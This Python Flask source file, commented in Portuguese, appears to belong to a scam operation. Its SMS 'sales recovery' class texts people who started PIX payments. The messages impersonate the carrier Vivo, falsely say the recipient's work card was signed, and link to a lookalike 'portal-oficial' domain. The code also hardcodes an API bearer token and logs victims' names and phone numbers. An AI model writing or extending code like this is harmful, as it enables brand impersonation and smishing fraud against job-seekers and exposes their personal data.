import os
import requests
import random
import string
from flask import current_app
from typing import Dict, Any, Optional
import json

class SMSRecoveryAPI:
    """
    Sistema de recuperação de vendas via SMS
    Envia SMS para clientes que criaram transações PIX
    """
    
    API_URL = "https://api-sms.replit.app/api/v1/sms/send"
    API_TOKEN = "227b3a78-df2c-4446-85f2-197199446898"
    
    def __init__(self):
        self.base_domain = "https://vivo.portal-oficial.org"
    
    def _get_headers(self) -> Dict[str, str]:
        """Retorna os headers necessários para a API de SMS"""
        return {
            'Authorization': f'Bearer {self.API_TOKEN}',
            'Content-Type': 'application/json'
        }
    
    def _generate_slug(self, user_data: Dict[str, Any]) -> str:
        """
        Gera uma slug curta única para o usuário baseada nos dados dele
        """
        # Pegar primeiras letras do nome + algumas letras aleatórias
        name_parts = user_data.get('name', 'Usuario').split()
        first_name = name_parts[0] if name_parts else 'User'
        
        # Primeiras 3 letras do nome + 4 caracteres aleatórios
        slug_base = first_name[:3].lower()
        random_chars = ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
        
        return f"{slug_base}{random_chars}"
    
    def _format_phone_number(self, phone: str) -> str:
        """
        Formata o número de telefone para o padrão internacional
        Entrada: '11998346572' -> Saída: '5511998346572'
        """
        # Remove caracteres não numéricos
        clean_phone = ''.join(filter(str.isdigit, phone))
        
        # Se não tem o código do país, adiciona 55
        if not clean_phone.startswith('55'):
            clean_phone = f"55{clean_phone}"
        
        return clean_phone
    
    def send_recovery_sms(self, user_data: Dict[str, Any], transaction_id: str, pix_data: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Envia SMS de recuperação de vendas para o cliente
        
        Args:
            user_data: Dados do usuário (nome, telefone, etc.)
            transaction_id: ID da transação PIX criada
            
        Returns:
            Dict com resultado do envio
        """
        try:
            # Log dos dados recebidos para debug
            current_app.logger.info(f"[SMS] Dados do usuário recebidos: {user_data}")
            current_app.logger.info(f"[SMS] Transaction ID: {transaction_id}")
            
            # Extrair primeiro nome (tentar múltiplos campos)
            name = user_data.get('name') or user_data.get('nome') or 'Cliente'
            name_parts = name.split()
            first_name = name_parts[0] if name_parts else 'Cliente'
            
            current_app.logger.info(f"[SMS] Nome extraído: {name} -> Primeiro nome: {first_name}")
            
            # Gerar slug única
            slug = self._generate_slug(user_data)
            
            # URL de recuperação
            recovery_url = f"{self.base_domain}/vaga/{slug}"
            
            # Salvar dados no banco PostgreSQL
            try:
                from models import RecoveryData
                
                # Preparar dados do PIX se disponíveis
                if not pix_data:
                    pix_data = {}
                
                # Criar registro no banco de dados
                recovery_record = RecoveryData.create_recovery_record(
                    slug=slug,
                    transaction_id=transaction_id,
                    user_data=user_data,
                    pix_data=pix_data,
                    recovery_url=recovery_url
                )
                
                current_app.logger.info(f"[SMS] Dados salvos no banco para slug: {slug}")
                
            except Exception as db_error:
                current_app.logger.error(f"[SMS] Erro ao salvar no banco: {str(db_error)}")
                # Continuar mesmo se não conseguir salvar no banco
            
            # Formatar número de telefone (tentar múltiplos campos)
            phone = user_data.get('phone') or user_data.get('telefone') or ''
            phone_number = self._format_phone_number(phone)
            
            current_app.logger.info(f"[SMS] Telefone extraído: {phone} -> Formatado: {phone_number}")
            
            # Verificar se temos telefone válido
            if not phone_number or len(phone_number) < 13:
                current_app.logger.error(f"[SMS] Telefone inválido: {phone_number}")
                return {
                    'success': False,
                    'error': f'Telefone inválido: {phone_number}'
                }
            
            # Template da mensagem
            message = f"VIVO INFORMA: {first_name}, sua carteira de trabalho foi assinada com sucesso. Se ainda deseja trabalhar acesso: {recovery_url}"
            
            # Validar tamanho da mensagem (máximo 160 caracteres)
            if len(message) > 160:
                # Versão mais curta se necessário
                message = f"VIVO: {first_name}, carteira assinada! Trabalhe conosco: {recovery_url}"
            
            # Dados para a nova API
            sms_data = {
                "phoneNumber": phone_number,
                "message": message
            }
            
            current_app.logger.info(f"Enviando SMS de recuperação para {first_name} ({phone_number})")
            current_app.logger.info(f"Slug gerada: {slug}")
            current_app.logger.info(f"URL de recuperação: {recovery_url}")
            
            # Fazer a requisição para a API
            headers = self._get_headers()
            
            current_app.logger.info(f"[SMS] Enviando para API: {self.API_URL}")
            current_app.logger.info(f"[SMS] Dados do SMS: {sms_data}")
            current_app.logger.info(f"[SMS] Headers (token mascarado): Authorization: Bearer {self.API_TOKEN[:10]}...")
            
            response = requests.post(
                self.API_URL,
                json=sms_data,
                headers=headers,
                timeout=30
            )
            
            current_app.logger.info(f"[SMS] Resposta da API SMS (Status: {response.status_code})")
            current_app.logger.info(f"[SMS] Conteúdo da resposta: {response.text}")
            
            if response.status_code == 200:
                response_data = response.json()
                current_app.logger.info(f"SMS enviado com sucesso: {response_data}")
                
                # Salvar dados do usuário para recuperação
                self._save_recovery_data(slug, user_data, transaction_id, recovery_url)
                
                return {
                    'success': True,
                    'slug': slug,
                    'recovery_url': recovery_url,
                    'message_sent': message,
                    'api_response': response_data
                }
            else:
                error_message = f"Erro na API SMS: {response.status_code} - {response.text}"
                current_app.logger.error(error_message)
                return {
                    'success': False,
                    'error': error_message,
                    'slug': slug,
                    'recovery_url': recovery_url
                }
                
        except Exception as e:
            error_message = f"Erro ao enviar SMS de recuperação: {str(e)}"
            current_app.logger.error(error_message)
            return {
                'success': False,
                'error': error_message
            }
    
    def _save_recovery_data(self, slug: str, user_data: Dict[str, Any], transaction_id: str, recovery_url: str):
        """
        Salva os dados de recuperação em um arquivo temporário
        Para que possam ser recuperados na página /vaga/{slug}
        """
        try:
            from datetime import datetime
            recovery_data = {
                'slug': slug,
                'user_data': user_data,
                'transaction_id': transaction_id,
                'recovery_url': recovery_url,
                'created_at': datetime.now().isoformat()
            }
            
            # Criar diretório se não existir
            os.makedirs('recovery_data', exist_ok=True)
            
            # Salvar dados em arquivo JSON
            with open(f'recovery_data/{slug}.json', 'w', encoding='utf-8') as f:
                json.dump(recovery_data, f, ensure_ascii=False, indent=2)
            
            current_app.logger.info(f"Dados de recuperação salvos para slug: {slug}")
            
        except Exception as e:
            current_app.logger.error(f"Erro ao salvar dados de recuperação: {str(e)}")
    
    def get_recovery_data(self, slug: str) -> Optional[Dict[str, Any]]:
        """
        Recupera os dados salvos para uma slug específica
        """
        try:
            file_path = f'recovery_data/{slug}.json'
            if os.path.exists(file_path):
                with open(file_path, 'r', encoding='utf-8') as f:
                    return json.load(f)
            return None
        except Exception as e:
            current_app.logger.error(f"Erro ao recuperar dados para slug {slug}: {str(e)}")
            return None

# Instância global
sms_recovery = SMSRecoveryAPI()